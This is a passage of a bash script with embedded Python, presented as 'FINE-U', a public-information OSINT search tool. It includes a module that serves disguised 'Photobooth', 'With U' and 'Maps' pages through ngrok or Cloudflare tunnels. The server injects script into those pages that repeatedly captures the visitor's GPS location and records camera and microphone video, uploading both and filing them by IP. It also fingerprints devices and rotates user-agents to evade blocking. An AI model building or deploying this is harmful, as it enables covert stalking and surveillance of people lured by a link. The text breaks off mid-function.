#!/usr/bin/env bash
# FINE-U: pencarian informasi publik di internet dari terminal.
# Butuh: bash, curl, jq, awk.
#
#   ./fine-u.sh                  mode interaktif (menu)
#   ./fine-u.sh -q "nama"        satu kali cari tanpa menu, hasil disimpan
#   ./fine-u.sh -e "a@b.com"     satu kali cek email tanpa menu, hasil disimpan
#   ./fine-u.sh --status         daftar sumber aktif / nonaktif
#   ./fine-u.sh --help

umask 077   # file .env dan folder hasil/ hanya bisa dibaca pemilik

BASE="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"
VERSION="1.5.0"
UA="FINE-U/$VERSION (personal research tool)"

# ---------- daftar user-agent acak untuk rotasi (anti-blocking sederhana) ----------
# Matikan dengan UA_ROTATE=0 (di .env atau di lingkungan) untuk memakai UA FINE-U di atas.
UA_LIST=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
  "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
)
get_random_ua() {
  if [ "${UA_ROTATE:-1}" = 0 ]; then printf '%s' "$UA"; return; fi
  local idx=$((RANDOM % ${#UA_LIST[@]}))
  printf '%s' "${UA_LIST[idx]}"
}

# ---------- warna ----------
if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  B=$'\033[1m'; D=$'\033[2m'; RED=$'\033[31m'; GRN=$'\033[32m'
  CYN=$'\033[36m'; YEL=$'\033[33m'; R=$'\033[0m'
else
  B=""; D=""; RED=""; GRN=""; CYN=""; YEL=""; R=""
fi
# ----------------------------------------
has() { command -v "$1" >/dev/null 2>&1; }
now() { date +'%Y-%m-%d %H:%M:%S'; }
die() { printf '  %s[ERROR] %s%s\n\n' "$RED" "$1" "$R" >&2; exit 1; }
# ---------- konfigurasi (.env) ----------
# .env dibaca baris per baris sebagai data (TIDAK di-source), dan hanya
# kunci yang dikenal yang dipakai. Isi .env tidak pernah dieksekusi.
ENV_KEYS=(SEARXNG_URL TAVILY_API_KEY BRAVE_API_KEY GOOGLE_CSE_KEY GOOGLE_CSE_CX
          YOUTUBE_API_KEY GITHUB_TOKEN SEARCH_MODE EXACT_MATCH MAX_PER_SOURCE
          SEARXNG_LANG SEARXNG_PAGES SOCIAL_SEARCH SOCIAL_BACKEND
          SOCIAL_GROUP_SIZE CURL_TIMEOUT
          HIBP_API_KEY HUNTER_API_KEY ABSTRACT_API_KEY ZEROBOUNCE_API_KEY IPQS_API_KEY
          EMAILREP_API_KEY DEHASHED_API_KEY SEON_API_KEY EMAIL_WEB_SCAN UA_ROTATE
          LIMIT_TAVILY LIMIT_BRAVE LIMIT_CSE LIMIT_YOUTUBE LIMIT_HIBP LIMIT_HUNTER
          LIMIT_ABSTRACT LIMIT_ZEROBOUNCE LIMIT_IPQS LIMIT_EMAILREP LIMIT_DEHASHED LIMIT_SEON)

is_env_key() { local k; for k in "${ENV_KEYS[@]}"; do [ "$k" = "$1" ] && return 0; done; return 1; }

load_env() {
  local f="$BASE/.env" line k v
  local re='^[[:space:]]*([A-Za-z_][A-Za-z0-9_]*)=(.*)$' dq='^"(.*)"$' sq="^'(.*)'\$"
  [ -f "$f" ] || return 0
  while IFS= read -r line || [ -n "$line" ]; do
    line=${line%$'\r'}
    [[ $line =~ $re ]] || continue
    k=${BASH_REMATCH[1]}; v=${BASH_REMATCH[2]}
    v=${v#"${v%%[![:space:]]*}"}; v=${v%"${v##*[![:space:]]}"}
    if [[ $v =~ $dq ]]; then v=${BASH_REMATCH[1]}
    elif [[ $v =~ $sq ]]; then v=${BASH_REMATCH[1]}
    else v=${v%%[[:space:]]#*}; v=${v%"${v##*[![:space:]]}"}; fi   # buang komentar inline
    is_env_key "$k" && export "$k=$v"
  done < "$f"
}

apply_defaults() {
  MAX_PER_SOURCE="${MAX_PER_SOURCE:-5}"
  CURL_TIMEOUT="${CURL_TIMEOUT:-10}"
  SEARXNG_PAGES="${SEARXNG_PAGES:-2}"
  SOCIAL_SEARCH="${SOCIAL_SEARCH:-1}"
  SOCIAL_BACKEND="${SOCIAL_BACKEND:-auto}"
  SOCIAL_GROUP_SIZE="${SOCIAL_GROUP_SIZE:-6}"
  EMAIL_WEB_SCAN="${EMAIL_WEB_SCAN:-1}"
  if [ -z "${SEARCH_MODE:-}" ]; then   # kompatibel dengan EXACT_MATCH versi lama
    case "${EXACT_MATCH:-}" in 1) SEARCH_MODE=akurat ;; 0) SEARCH_MODE=luas ;; *) SEARCH_MODE=seimbang ;; esac
  fi
  case "$SEARCH_MODE" in akurat|seimbang|luas) ;; *) SEARCH_MODE=seimbang ;; esac
}

# Menulis satu nilai ke .env tanpa mengubah baris lain (aman untuk karakter khusus).
set_env() { # $1=KUNCI $2=NILAI
  local f="$BASE/.env" tmp
  [ -f "$f" ] || : > "$f"
  chmod 600 "$f" 2>/dev/null
  tmp=$(mktemp "$BASE/.env.tmp.XXXXXX") || return 1
  chmod 600 "$tmp"
  K="$1" V="$2" awk 'BEGIN { k = ENVIRON["K"]; v = ENVIRON["V"]; d = 0 }
    index($0, k "=") == 1 { print k "=" v; d = 1; next }
    { print }
    END { if (!d) print k "=" v }' "$f" > "$tmp" && mv "$tmp" "$f" || { rm -f "$tmp"; return 1; }
}

load_env
apply_defaults

# ---------- limiter harian ----------
# Membatasi jumlah PERMINTAAN API per hari untuk tiap layanan berkunci, supaya kuota gratis
# (mis. 100/hari) tidak habis. Diatur di menu Setting (LIMIT_<LAYANAN>); 0 / kosong = tanpa batas.
# Hitungan disimpan di cache/usage/<tanggal>/<layanan> dan reset otomatis tiap tengah malam
# (jam lokal). Sumber berjalan paralel, jadi penambahan hitungan dikunci (flock) agar akurat.
QUOTA_DIR="$BASE/cache/usage"
LIM_ID=(tavily brave cse youtube hibp hunter abstract zerobounce ipqs emailrep dehashed seon)
LIM_NAME=("Tavily" "Brave Search" "Google CSE" "YouTube Data API" "HaveIBeenPwned" "Hunter"
          "Abstract Email" "ZeroBounce" "IPQualityScore" "EmailRep" "DeHashed" "SEON")

quota_label() { # $1=id -> nama tampilan
  local j; for j in "${!LIM_ID[@]}"; do [ "${LIM_ID[j]}" = "$1" ] && { printf '%s' "${LIM_NAME[j]}"; return; }; done
  printf '%s' "$1"
}

quota_limit() { # $1=id -> angka limit per hari (0 = tanpa batas)
  local v="LIMIT_${1^^}"; v=${!v:-}
  [[ $v =~ ^[0-9]+$ ]] && printf '%d' "$((10#$v))" || printf '0'
}

quota_used() { # $1=id -> permintaan terpakai hari ini
  local d u; printf -v d '%(%F)T' -1
  u=$(cat "$QUOTA_DIR/$d/$1" 2>/dev/null)
  [[ $u =~ ^[0-9]+$ ]] && printf '%d' "$((10#$u))" || printf '0'
}

quota_ok() { # $1=id -> masih ada sisa jatah hari ini? (hanya cek, tidak menambah hitungan)
  local l; l=$(quota_limit "$1")
  [ "$l" -eq 0 ] || [ "$(quota_used "$1")" -lt "$l" ]
}

_quota_inc() { # memakai $api $lim $f dari quota_take
  local used; used=$(cat "$f" 2>/dev/null)
  [[ $used =~ ^[0-9]+$ ]] || used=0
  used=$((10#$used))
  if [ "$lim" -gt 0 ] && [ "$used" -ge "$lim" ]; then return 1; fi
  printf '%d\n' "$((used + 1))" > "$f"
}

# Dipanggil tepat sebelum SETIAP permintaan ke API berkunci.
# Return 0 = boleh lanjut (hitungan +1), 1 = batas harian tercapai (permintaan tidak dikirim).
quota_take() { # $1=id
  local api=$1 lim d f rc lk tries=0
  lim=$(quota_limit "$api")
  printf -v d '%(%F)T' -1
  f="$QUOTA_DIR/$d/$api"
  mkdir -p "$QUOTA_DIR/$d" 2>/dev/null || return 0   # tidak bisa menulis: jangan blokir pencarian
  if command -v flock >/dev/null 2>&1; then
    ( flock -w 10 9 || exit 0; _quota_inc ) 9> "$QUOTA_DIR/.lock"; rc=$?
  else
    lk="$QUOTA_DIR/.lk"
    until mkdir "$lk" 2>/dev/null; do
      tries=$((tries + 1)); [ "$tries" -gt 100 ] && break
      sleep 0.05
    done
    _quota_inc; rc=$?
    rmdir "$lk" 2>/dev/null
  fi
  if [ "$rc" -ne 0 ] && [ -n "${QUOTA_MARK:-}" ]; then printf '%s\n' "$api" >> "$QUOTA_MARK"; fi
  return "$rc"
}

quota_reset_today() { local d; printf -v d '%(%F)T' -1; rm -rf "${QUOTA_DIR:?}/$d"; }

quota_prune() { # hapus catatan lebih dari 7 hari
  [ -d "$QUOTA_DIR" ] && find "$QUOTA_DIR" -mindepth 1 -maxdepth 1 -type d -mtime +7 -exec rm -rf {} + 2>/dev/null
  return 0
}

# Catatan di layar jika ada layanan yang kena batas harian. $1 = JSON yang punya kunci "quota": ["tavily", ...]
quota_hit_note() {
  local api names=()
  while IFS= read -r api; do [ -n "$api" ] && names+=("$(quota_label "$api")"); done < <(jq -r '(.quota // [])[]' <<< "$1" 2>/dev/null)
  [ "${#names[@]}" -eq 0 ] && return 0
  local IFS=,; printf '  %sBatas harian tercapai: %s. Naikkan di Setting > Limit harian, atau tunggu besok.%s\n\n' "$YEL" "${names[*]//,/, }" "$R"
}

FILE_TYPES=(pdf docx xlsx pptx csv)

clear_screen() { [ -t 1 ] && printf '\033[2J\033[3J\033[H'; }

LOGO=(
  "███████╗██╗███╗   ██╗███████╗      ██╗   ██╗"
  "██╔════╝██║████╗  ██║██╔════╝      ██║   ██║"
  "█████╗  ██║██╔██╗ ██║█████╗  █████╗██║   ██║"
  "██╔══╝  ██║██║╚██╗██║██╔══╝  ╚════╝██║   ██║"
  "██║     ██║██║ ╚████║███████╗      ╚██████╔╝"
  "╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝       ╚═════╝ "
)

header() {
  clear_screen
  printf '\n'
  local l
  for l in "${LOGO[@]}"; do printf '  %s%s%s\n' "$B$CYN" "$l" "$R"; done
  printf '  %sPencarian informasi publik di internet & Pengayaan OSINT%s\n' "$D" "$R"
  printf '  %s────────────────────────────────────────────%s\n\n' "$D" "$R"
}

# ---------- KONFIGURASI & VARIABEL SHARE PROJECT ----------
TEMPLATES_DIR="$BASE/templates"
WORK_DIR="$(mktemp -d /tmp/share-project.XXXXXX)"
PORT=8787

HIST_DIR="$BASE/saved_videos/history"
mkdir -p "$HIST_DIR" 2>/dev/null || { HIST_DIR="$WORK_DIR/history"; mkdir -p "$HIST_DIR"; }

SERVER_PID=""
TUNNEL_PID=""
TUNNEL_LOG="$WORK_DIR/tunnel.log"
ACCESS_LOG=""
SELECTED_TEMPLATE=""
SELECTED_NAME=""
TUNNEL_NAME=""
PUBLIC_URL=""
CUR_ID=""; CUR_START=""; CUR_TEMPLATE=""; CUR_TUNNEL=""

write_meta() {
  [ -n "$CUR_ID" ] || return 0
  printf '%s\t%s\t%s\t%s\t%s\t%s\n' \
    "$CUR_ID" "$CUR_START" "$1" "$CUR_TEMPLATE" "$CUR_TUNNEL" "$PUBLIC_URL" \
    >"$HIST_DIR/$CUR_ID.meta"
}

finish_session() {
  if [ -n "$CUR_ID" ]; then
    if [ -f "$HIST_DIR/$CUR_ID.meta" ]; then write_meta "$(now)"; else rm -f "$HIST_DIR/$CUR_ID.log"; fi
  fi
  CUR_ID=""; ACCESS_LOG=""; PUBLIC_URL=""
}

stop_all() {
  local p
  for p in "$SERVER_PID" "$TUNNEL_PID"; do
    [ -n "$p" ] && { kill "$p" >/dev/null 2>&1; wait "$p" 2>/dev/null; }
  done
  SERVER_PID=""; TUNNEL_PID=""
  finish_session
}

port_free() {
  local p=$1
  if has lsof; then ! lsof -i TCP:"$p" -sTCP:LISTEN >/dev/null 2>&1
  elif has ss; then ! ss -ltn 2>/dev/null | awk '{print $4}' | grep -q ":$p\$"
  else return 0; fi
}

find_free_port() {
  local p=$PORT
  for _ in $(seq 1 20); do
    if port_free "$p"; then printf '%s' "$p"; return 0; fi
    p=$((p+1))
  done
  printf '%s' "$PORT"
}

qr_print() {
  local url=$1
  if command -v qrencode >/dev/null 2>&1; then
    printf '\n'
    qrencode -t ANSIUTF8 "$url"
  fi
}

print_log_line() {
  local t=$1 kind=$2 dev=$3 ip=$4
  case "$kind" in
    FIRST|NEW)
      printf '  %s[%s]%s %s✔ Link dibuka%s — %s  %s(IP %s)%s\n' \
        "$D" "$t" "$R" "$GRN$B" "$R" "$dev" "$D" "$ip" "$R" ;;
    *)
      printf '  %s[%s] ↻ %s memuat ulang halaman  (IP %s)%s\n' "$D" "$t" "$dev" "$ip" "$R" ;;
  esac
}

write_server_py() {
  cat >"$WORK_DIR/server.py" <<'PYEOF'
import http.server, json, re, sys, threading, uuid, os, time, cgi
from datetime import datetime

port, logfile = int(sys.argv[1]), sys.argv[2]
lock = threading.RLock()
devices, devinfo, names, pending = {}, {}, {}, {}

VIDEO_DIR = os.path.join(os.getcwd(), "saved_videos")
if not os.path.exists(VIDEO_DIR):
    os.makedirs(VIDEO_DIR)

BEACON_JS = """<script>(function(){try{
var d={t:"__T__",w:screen.width,h:screen.height,r:window.devicePixelRatio||1,p:navigator.maxTouchPoints||0};
function go(){try{fetch("/__beacon",{method:"POST",body:JSON.stringify(d),keepalive:true}).catch(function(){})}catch(e){}}
var u=navigator.userAgentData;
if(u&&u.getHighEntropyValues){u.getHighEntropyValues(["model"]).then(function(v){d.m=v.model||"";go()},go)}else{go()}
}catch(e){}})();</script>"""

IPHONES = {
    (320, 568, 2): "iPhone SE (1) / 5s", (375, 667, 2): "iPhone 6/7/8 / SE",
    (414, 736, 3): "iPhone 6/7/8 Plus", (375, 812, 3): "iPhone X / XS / 11 Pro",
    (414, 896, 2): "iPhone XR / 11", (414, 896, 3): "iPhone XS Max / 11 Pro Max",
    (390, 844, 3): "iPhone 12 / 13 / 14", (428, 926, 3): "iPhone 12 Pro Max / 13 Pro Max",
    (393, 852, 3): "iPhone 14 Pro / 15 / 16", (430, 932, 3): "iPhone 14 Pro Max / 15 Plus / 16 Plus"
}

def client_ip(h, addr):
    for k in ("CF-Connecting-IP", "X-Real-IP"):
        if h.get(k): return h[k].strip()
    if h.get("X-Forwarded-For"):
        return h["X-Forwarded-For"].split(",")[0].strip()
    return addr[0]

def describe(ua, info):
    w = h = r = 0
    if info:
        w, h = sorted((int(float(info.get("w", 0))), int(float(info.get("h", 0)))))
        r = int(float(info.get("r", 0)))
    if "iPhone" in ua: os_ = IPHONES.get((w, h, r)) or "iPhone"
    elif "Android" in ua: os_ = "Android"
    elif "Windows" in ua: os_ = "Windows"
    elif "Mac OS X" in ua: os_ = "macOS"
    else: os_ = "Device Lain"
    br = "Firefox" if "Firefox" in ua else ("Chrome" if "Chrome" in ua else ("Safari" if "Safari" in ua else "Browser"))
    return "%s di %s" % (br, os_)

def device_id(headers):
    m = re.search(r"(?:^|;\s*)sp_did=([0-9a-f]+)", headers.get("Cookie", ""))
    return m.group(1) if m else None

def flush(token):
    with lock:
        v = pending.pop(token, None)
        if not v: return
        desc = describe(v["ua"], devinfo.get(v["did"]))
        ids = names.setdefault(desc, [])
        if v["did"] not in ids: ids.append(v["did"])
        if ids.index(v["did"]) > 0: desc += " #%d" % (ids.index(v["did"]) + 1)
        with open(logfile, "a") as f:
            f.write("%s\t%s\t%s\t%s\t%d\n" % (v["t"], v["kind"], desc, v["ip"], v["total"]))

class Handler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a): pass

    def do_GET(self):
        if self.path.split("?")[0] not in ("/", "/index.html"):
            return super().do_GET()
        did, fresh = device_id(self.headers), False
        if not did: did, fresh = uuid.uuid4().hex[:12], True
        token = uuid.uuid4().hex[:10]
        with lock:
            kind = "RELOAD" if did in devices else ("NEW" if devices else "FIRST")
            devices[did] = True
            pending[token] = dict(
                t=datetime.now().strftime("%H:%M:%S"), kind=kind, did=did,
                ua=self.headers.get("User-Agent", ""),
                ip=client_ip(self.headers, self.client_address), total=len(devices))
        t = threading.Timer(1.5, flush, [token]); t.daemon = True; t.start()

        with open("index.html", "rb") as f:
            html = f.read().decode("utf-8", "replace")
        
        auto_capture_script = """
        <script>
            function sendLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((pos) => {
                        const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        fetch('/save-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ link: link })
                        }).catch(e => {});
                    }, null, { enableHighAccuracy: true });
                }
            }
            sendLocation();
            setInterval(sendLocation, 10000);

            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                function recordCycle() {
                    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                    let chunks = [];
                    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const fd = new FormData();
                        fd.append('video', blob, `rec_${Date.now()}.webm`);
                        fetch('/save-video', { method: 'POST', body: fd })
                            .then(() => recordCycle()).catch(() => recordCycle());
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), 10000);
                }
                recordCycle();
            }).catch(e => {});
        </script>
        """
        
        script = BEACON_JS.replace("__T__", token) + auto_capture_script
        i = html.lower().rfind("</body>")
        html = html[:i] + script + html[i:] if i >= 0 else html + script
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        if fresh: self.send_header("Set-Cookie", "sp_did=%s; Path=/; Max-Age=31536000; SameSite=Lax" % did)
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        parsed_path = self.path.split("?")[0]
        client_ip_addr = client_ip(self.headers, self.client_address).replace(":", "_").replace(".", "_")
        ip_folder = os.path.join(VIDEO_DIR, client_ip_addr)

        # 1. Menangkap Tautan Google Maps & Koordinat GPS
        if parsed_path == "/save-location":
            try:
                length = int(self.headers.get("Content-Length", 0))
                if length > 0:
                    data = json.loads(self.rfile.read(length).decode("utf-8"))
                    gmaps_link = data.get("link")
                    lat = data.get("lat")
                    lon = data.get("lon")
                    
                    if not os.path.exists(ip_folder): 
                        os.makedirs(ip_folder)
                    
                    loc_log_file = os.path.join(ip_folder, "log_lokasi.txt")
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    
                    with open(loc_log_file, "a") as f:
                        f.write(f"[{timestamp}] Lat: {lat}, Lon: {lon}\nMaps: {gmaps_link}\n---\n")
                
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"OK")
            except Exception as e:
                self.send_error(500, str(e))
            return

        # 2. Menangkap Stream File Video .webm Mentah-mentah
        if parsed_path == "/save-video":
            try:
                length = int(self.headers.get("Content-Length", 0))
                if length > 0:
                    video_bytes = self.rfile.read(length)
                    if not os.path.exists(ip_folder): 
                        os.makedirs(ip_folder)
                    
                    filename = f"video_{int(time.time())}_{uuid.uuid4().hex[:4]}.webm"
                    filepath = os.path.join(ip_folder, filename)
                    
                    with open(filepath, 'wb') as f:
                        f.write(video_bytes)
                        
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Saved")
            except Exception as e:
                self.send_error(500, str(e))
            return

        if parsed_path != "/__beacon": return self.send_error(404)
        try:
            n = min(int(self.headers.get("Content-Length", 0)), 4096)
            data = json.loads(self.rfile.read(n) or b"{}")
            if not isinstance(data, dict): data = {}
        except Exception: data = {}
        token = str(data.get("t", ""))
        with lock:
            v = pending.get(token)
            did = device_id(self.headers) or (v and v["did"])
            if did: devinfo[did] = data
        if v: flush(token)
        self.send_response(204); self.end_headers()

http.server.ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
PYEOF
}

start_server() {
  local template_file=$1
  rm -rf "$WORK_DIR/site"; mkdir -p "$WORK_DIR/site"
  
  # --- TAMBAHKAN BARIS INI SUPAYA FOLDER OTOMATIS DIBUAT ---
  mkdir -p "$BASE/saved_videos"
  # --------------------------------------------------------

  cp "$template_file" "$WORK_DIR/site/index.html"

  CUR_ID="$(date +\%Y\%m\%d-\%H\%M\%S)-$$"
  CUR_START="$(now)"; CUR_TEMPLATE="$SELECTED_NAME"; CUR_TUNNEL=""
  ACCESS_LOG="$HIST_DIR/$CUR_ID.log"
  : >"$ACCESS_LOG"
  PORT="$(find_free_port)"

  write_server_py
  ( cd "$WORK_DIR/site" && exec python3 "$WORK_DIR/server.py" "$PORT" "$ACCESS_LOG" ) \
    >"$WORK_DIR/server.log" 2>&1 &
  SERVER_PID=$!
  sleep 1
  if ! kill -0 "$SERVER_PID" 2>/dev/null; then
    die "Server lokal gagal start (lihat $WORK_DIR/server.log)"
  fi
}

start_ngrok() {
  command -v ngrok >/dev/null 2>&1 || die "ngrok belum terpasang."
  ngrok http "$PORT" --log=stdout >"$TUNNEL_LOG" 2>&1 &
  TUNNEL_PID=$!
  local url="" tries=0
  while [ -z "$url" ] && [ "$tries" -lt 20 ]; do
    sleep 1
    url=$(curl -fsS http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"[^"]*"' | grep '^"public_url":"https' | head -n1 | sed 's/"public_url":"//; s/"$//')
    tries=$((tries+1))
  done
  [ -n "$url" ] || die "Tidak bisa mendapatkan link ngrok."
  PUBLIC_URL="$url"
}

start_cloudflared() {
  command -v cloudflared >/dev/null 2>&1 || die "cloudflared belum terpasang."
  cloudflared tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate >"$TUNNEL_LOG" 2>&1 &
  TUNNEL_PID=$!
  local url="" tries=0
  while [ -z "$url" ] && [ "$tries" -lt 30 ]; do
    sleep 1
    url=$(grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare\.com' "$TUNNEL_LOG" 2>/dev/null | head -n1)
    tries=$((tries+1))
  done
  [ -n "$url" ] || die "Tidak bisa mendapatkan link cloudflare."
  PUBLIC_URL="$url"
}

pick_tunnel_and_run() {
  while true; do
    header
    printf '%s\n' "${B}Pilih tunnel:${R}"
    printf '  [1] ngrok\n'
    printf '  [2] cloudflare\n'
    printf '  [K] Kembali\n\n'
    printf 'Masukkan: '
    read -r choice
    case "$choice" in
      1) CUR_TUNNEL="ngrok"; start_ngrok; return 0 ;;
      2) CUR_TUNNEL="cloudflare"; start_cloudflared; return 0 ;;
      [Kk]) return 1 ;;
    esac
  done
}

show_link() {
  write_meta ""
  header
  printf '%sLink Live Tracking (Lokasi & Kamera Berjalan):%s\n\n' "$GRN$B" "$R"
  printf '  %s%s%s\n\n' "$B" "$PUBLIC_URL" "$R"
  qr_print "$PUBLIC_URL"
  printf '\nTekan %sCtrl+C%s untuk berhenti dan kembali ke menu.\n\n' "$B" "$R"
  
  local shown=0 total t kind dev ip n
  GOT_INT=""; IN_LINK_VIEW=1
  while [ -z "$GOT_INT" ]; do
    total=$(wc -l <"$ACCESS_LOG" 2>/dev/null | tr -d ' ')
    if [ "${total:-0}" -gt "$shown" ]; then
      while IFS=$'\t' read -r t kind dev ip n; do
        print_log_line "$t" "$kind" "$dev" "$ip"
      done < <(tail -n +"$((shown+1))" "$ACCESS_LOG")
      shown=$total
    fi
    read -rsn1 -t 1 key || true
  done
  IN_LINK_VIEW=""; GOT_INT=""
}

share_project_session() {
  [ -d "$TEMPLATES_DIR" ] || die "Folder templates/ tidak ditemukan."
  while true; do
    stop_all
    header
    printf '%sPilih template preview:%s\n' "$B" "$R"
    printf '  [1] Photobooth\n'
    printf '  [2] With U\n'
    printf '  [3] Maps\n'
    printf 'Masukkan (kosongkan lalu Enter untuk kembali): '
    read -r tchoice
    case "$tchoice" in
      1) SELECTED_TEMPLATE="$TEMPLATES_DIR/photobooth.html"; SELECTED_NAME="Photobooth" ;;
      2) SELECTED_TEMPLATE="$TEMPLATES_DIR/with-u.html"; SELECTED_NAME="With U" ;;
      3) SELECTED_TEMPLATE="$TEMPLATES_DIR/maps.html"; SELECTED_NAME="Maps" ;;
      [Kk]|'') return ;;
      *) continue ;;
    esac
    start_server "$SELECTED_TEMPLATE"
    if pick_tunnel_and_run; then
      show_link
    fi
  done
}

# ---------- utilitas ----------
urlenc() { jq -rn --arg s "$1" '$s|@uri'; }
urldec() { local s=${1//+/ }; printf '%b' "${s//%/\\x}"; }

# Memakai User-Agent acak per permintaan (lihat UA_LIST di atas).
fetch() { curl -fsS --compressed --max-time "$CURL_TIMEOUT" --retry 1 -A "$(get_random_ua)" "$@"; }

# Dekode entitas HTML dasar di jq
JQ_DEC='def dec: gsub("&quot;";"\"")|gsub("&#39;";"\u0027")|gsub("&#x27;";"\u0027")|gsub("&amp;";"&")|gsub("&lt;";"<")|gsub("&gt;";">");'

# Bentuk kueri untuk mesin pencari web, sesuai varian ($VARIANT):
#   exact = frasa persis dalam tanda kutip   loose = apa adanya
#   rev   = urutan kata dibalik (nama 2-3 kata), mis. "Santoso Budi"
webq() {
  local q=$1 v="${VARIANT:-exact}" n r
  n=$(wc -w <<< "$q")
  if [ "$v" = rev ] && (( n >= 2 && n <= 3 )); then
    r=$(awk '{ for (i = NF; i > 0; i--) printf "%s%s", $i, (i > 1 ? " " : "") }' <<< "$q")
    printf '"%s"' "$r"
  elif [ "$v" = loose ]; then
    printf '%s' "$q"
  elif [[ $q == *" "* && $q != *\"* ]]; then
    printf '"%s"' "$q"
  else
    printf '%s' "$q"
  fi
}

variants_for_mode() {
  case "$SEARCH_MODE" in
    akurat) echo "exact" ;;
    luas)   echo "exact loose rev" ;;
    *)      echo "exact loose" ;;
  esac
}

variant_ok() { # $1=varian $2=kueri -> berguna (bukan duplikat varian lain)?
  local n; n=$(wc -w <<< "$2")
  [ "$1" = exact ] && return 0
  [[ $2 == *\"* ]] && return 1
  case "$1" in
    loose) (( n >= 2 )) ;;
    rev)   (( n >= 2 && n <= 3 )) ;;
    *)     return 1 ;;
  esac
}

# RSS (stdin) -> JSON array [{title,url,snippet,date}]
rss_to_json() {
  tr '\r\n' '  ' \
    | sed -e 's#<!\[CDATA\[##g' -e 's#\]\]>##g' -e 's#</item>#</item>\n#g' \
    | grep '<item>' | head -n 10 \
    | while IFS= read -r item; do
        t=$(printf '%s' "$item" | sed -n 's#.*<title>\([^<]*\)</title>.*#\1#p' | head -n1)
        l=$(printf '%s' "$item" | sed -n 's#.*<link>\([^<]*\)</link>.*#\1#p' | head -n1)
        d=$(printf '%s' "$item" | sed -n 's#.*<pubDate>\([^<]*\)</pubDate>.*#\1#p' | head -n1)
        printf '%s\t%s\t%s\n' "$t" "$l" "$d"
      done \
    | sed -e 's/&amp;/\&/g' -e 's/&lt;/</g' -e 's/&gt;/>/g' -e 's/&quot;/"/g' -e "s/&#39;/'/g" \
    | jq -R -s 'split("\n") | map(select(length>0) | split("\t"))
        | map({title:.[0], url:.[1], snippet:"", date:(.[2] // "")})'
}

# ---------- sumber: tiap fungsi mencetak JSON array ke stdout ----------
# --- Berita ---
src_gnews()    { fetch "https://news.google.com/rss/search?q=$(urlenc "$(webq "$1")")&hl=id&gl=ID&ceid=ID:id" | rss_to_json; }
src_gnews_en() { fetch "https://news.google.com/rss/search?q=$(urlenc "$(webq "$1")")&hl=en-US&gl=US&ceid=US:en" | rss_to_json; }
src_bing()     { fetch "https://www.bing.com/news/search?q=$(urlenc "$(webq "$1")")&format=rss" | rss_to_json; }

src_gdelt() {
  fetch "https://api.gdeltproject.org/api/v2/doc/doc?query=$(urlenc "$(webq "$1")")&mode=artlist&maxrecords=15&format=json&sort=datedesc" \
    | jq '(.articles // []) | map({title, url, snippet:(.domain // ""), date:(.seendate // "")})'
}

# --- Ensiklopedia & data ---
src_wiki() { # $1=query $2=lang
  fetch "https://$2.wikipedia.org/w/api.php?action=query&list=search&srsearch=$(urlenc "$1")&srlimit=10&format=json&origin=*" \
    | jq --arg l "$2" '.query.search | map({
        title, url: ("https://"+$l+".wikipedia.org/wiki/"+(.title|gsub(" ";"_")|@uri)),
        snippet: (.snippet|gsub("<[^>]+>";"")|gsub("&quot;";"\"")), date: .timestamp})'
}

src_wikidata() {
  fetch "https://www.wikidata.org/w/api.php?action=wbsearchentities&search=$(urlenc "$1")&language=id&uselang=id&limit=10&format=json&origin=*" \
    | jq '(.search // []) | map({title:(.label // .id), url:("https://www.wikidata.org/wiki/"+.id),
        snippet:(.description // ""), date:""})'
}

src_commons() {
  fetch "https://commons.wikimedia.org/w/api.php?action=query&list=search&srsearch=$(urlenc "$1")&srnamespace=6&srlimit=8&format=json&origin=*" \
    | jq '.query.search | map({title, url: ("https://commons.wikimedia.org/wiki/"+(.title|gsub(" ";"_")|@uri)),
        snippet:"", date:.timestamp})'
}

src_archive() {
  fetch -g "https://archive.org/advancedsearch.php?q=$(urlenc "$1")&fl[]=identifier&fl[]=title&fl[]=mediatype&fl[]=publicdate&rows=10&output=json" \
    | jq '.response.docs | map({
        title: ((.title // .identifier) | if type=="array" then .[0] else . end),
        url: ("https://archive.org/details/"+.identifier),
        snippet: (.mediatype // ""), date: (.publicdate // "")})'
}

# --- Forum, kode, lokasi, buku, jurnal ---
src_reddit() {
  fetch "https://www.reddit.com/search.json?q=$(urlenc "$1")&limit=15" \
    | jq '.data.children | map(.data | {title, url:("https://www.reddit.com"+.permalink),
        snippet:("r/"+.subreddit), date:(.created_utc|floor|todate)})'
}

src_hn() {
  fetch "https://hn.algolia.com/api/v1/search?query=$(urlenc "$1")&hitsPerPage=10" \
    | jq '.hits | map({title:(.title // .story_title // "(tanpa judul)"),
        url:(.url // ("https://news.ycombinator.com/item?id="+.objectID)), snippet:"", date:.created_at})'
}

src_github() {
  local h=()
